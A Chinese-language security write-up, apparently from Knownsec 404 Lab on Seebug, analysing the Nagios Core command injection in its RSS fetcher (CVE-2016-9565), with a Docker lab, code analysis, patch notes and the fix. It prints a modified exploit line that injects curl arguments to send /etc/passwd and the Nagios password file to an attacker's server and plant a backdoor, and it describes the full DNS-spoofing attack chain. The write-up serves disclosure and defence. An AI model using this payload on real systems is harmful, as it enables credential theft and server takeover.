**Author: p0wd3r, dawu (知道创宇404安全实验室)**

**Date: 2016-12-15**

## 0x00 漏洞概述

### 1.漏洞简介

[Nagios](https://www.nagios.org) 是一款监控IT基础设施的程序，近日安全研究人员 [Dawid
Golunski](http://legalhackers.com/) 发现在 [Nagios
Core](https://www.nagios.org/projects/nagios-core/) 中存在一个代码执行漏洞：攻击者首先伪装成 RSS
订阅源，当受害应用获取 RSS 信息时攻击者将恶意构造的数据传给受害者，程序在处理过程中将恶意数据注入到了 curl 的命令中，进而代码执行。

### 2.漏洞影响

漏洞触发前提：

  1. 攻击者可伪装成`https://www.nagios.org`，利用 dns 欺骗等方法
  2. 攻击者被授权，或者攻击者诱使授权用户访问`rss-corefeed.php`、`rss-newsfeed.php`和`rss-corebanner.php`其中一个文件。

成功攻击可执行任意代码。

### 3.影响版本

Nagios Core < 4.2.2

## 0x01 漏洞复现

### 1\. 环境搭建

Dockerfile:

    
    
    FROM quantumobject/docker-nagios
    
    RUN sed -i '99d' /usr/local/nagios/share/includes/rss/rss_fetch.inc
    
    RUN mkdir /tmp/tmp && chown www-data:www-data /tmp/tmp

然后运行：

    
    
    docker run -p 80:80 --name nagios -d quantumobject/docker-nagios

访问`http://127.0.0.1/nagios`，用`nagiosadmin:admin`登录即可

### 2.漏洞分析

漏洞触发点在`/usr/local/nagios/share/includes/rss/extlib/Snoopy.class.inc`第657行，`_httpsrequest`函数中：

    
    
    // version < 4.2.0
    exec($this->curl_path." -D \"/tmp/$headerfile\"".escapeshellcmd($cmdline_params)." ".escapeshellcmd($URI),$results,$return);
    
    // vserion >= 4.2.0 && version < 4.2.2
    exec($this->curl_path." -D \"/tmp/$headerfile\"".$cmdline_params." \"".escapeshellcmd($URI)."\"",$results,$return);

这里使用了`escapeshellcmd`来对 **命令参数** 进行处理，`escapeshellcmd`的作用如下：

![Alt
text](https://images.seebug.org/content/images/2016/12/escapeshellcmd.png-w331s)

作者意在防止多条命令的执行，但是这样处理并没有防止注入 **多个参数**
样如果`$URI`可控，再配合`curl`的一些特性便可以进行文件读写，进而代码执行。（一般来说为防止注入多个参数要使用
[escapeshellarg](http://php.net/manual/zh/function.escapeshellarg.php)，但该函数也不是绝对安全，详见
[CVE-2015-4642](https://bugs.php.net/bug.php?id=69646)。）

因为之前爆出的 [CVE-2008-4796](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4796)，代码在4.2.0版本做了改变，但是该补丁可以被绕过，只要我们在输入中闭合前后的`"`即可。

下面我们来看`$URI`是否可控。根据代码逻辑来看，`_httpsrequet`被`usr/local/nagios/share/includes/rss/rss_fetch.inc`中的`fetch_rss`函数调用，这样我们创建这样一个测试文件`test.php`：

    
    
    <?php
    define('MAGPIE_DIR', './includes/rss/');
    define('MAGPIE_CACHE_ON', 0);
    define('MAGPIE_CACHE_AGE', 0);
    define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache');
    require_once(MAGPIE_DIR.'rss_fetch.inc');
    
    fetch_rss('https://www.baidu.com --version');

访问`http://127.0.0.1/nagios/test.php`之后开启动态调试，我们在上述`exec`函数处下断点，函数调用栈如下：

![Alt text](https://images.seebug.org/content/images/2016/12/req-call.png-w331s)

`$URI`情况如下：

![Alt text](https://images.seebug.org/content/images/2016/12/uri-control.png-w331s)

可知`$URI`可控，并且在传入过程中没有被过滤。

接下来需要构造`curl`参数来得到我们想要的结果，这里我们使用 Dawid Golunski 提供的
[Exp](https://github.com/0xwindows/VulScritp/blob/master/nagios/nagios_cmd_injection.py)，需要注意的是，他提供的代码可验证4.2.0之前的版本，若验证版本大于等于4.2.0且小于4.2.2时，需对其代码进行一下更改，加上闭合所需要的双引号：

    
    
    # 第44行
    self.redirect('https://' + self.request.host + '/nagioshack" -Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '"', permanent=False)

该 Exp 具体流程如下：

  1. 在攻击者的服务器上开启一个 http/https 服务器
  2. 受害者使用`fetch_rss`向该服务器发其请求
  3. 攻击者收到请求后对其进行重定向，重定向 url 为 `https:// + 攻击者服务器 + payload`，payload 中使用`-F`将文件内容发送给服务器，`--trace-ascii`将流量记录到文件中（类似 Roundcube RCE 中 `mail`函数的`-X`）。
  4. 服务器接收到重定向的请求后进行了以下三个操作：
    1. 解析文件内容
    2. 返回后门内容进而通过流量记录写到后门文件中
    3. 返回构造好的XML，在`description`中添加`<img src=backdoor.php>`
  5. 受害者解析XML并将`description`的内容输出到html中，进而自动执行后门

为了方便验证，我们在网站目录下创建一个`exp.php`:

    
    
    <?php
    define('MAGPIE_DIR', './includes/rss/');
    define('MAGPIE_CACHE_ON', 0);
    define('MAGPIE_CACHE_AGE', 0);
    define('MAGPIE_CACHE_DIR', '/tmp/magpie_cache');
    require_once(MAGPIE_DIR.'rss_fetch.inc');
    
    fetch_rss('http://172.17.0.3');

（仅为验证漏洞，这里我们并没有解析XML）然后我们在`172.17.0.3`上运行
Exp，然后访问`http://127.0.0.1/exp.php`即可得到结果：

![Alt text](https://images.seebug.org/content/images/2016/12/exp.png-w331s)

实际测试时 Exp 中的后门代码有可能在日志中会被截断从而导致命令执行不成功，建议写入简短的一句话：

![Alt
text](https://images.seebug.org/content/images/2016/12/backdoor.png-w331s)

真实情况下，`fetch_rss`的调用情况如下：

![Alt text](https://images.seebug.org/content/images/2016/12/req-call-1.png-w331s)

可见我们并不能控制其参数的值，所以只能通过 dns
欺骗等手段使目标对`https://www.nagios.org`的访问指向攻击者的服务器，进而触发漏洞。

### 3.补丁分析

4.2.2版本中删除了`includes/`以及`rss-corefeed.php`、`rss-newsfeed.php`和`rss-corebanner.php`。

## 0x02 修复方案

升级到4.2.2

## 0x03 参考

  1. Dawid Golunski 的漏洞报告：<http://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>
  2. `escapeshellcmd`的使用手册：<http://php.net/manual/zh/function.escapeshellcmd.php>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/146/>

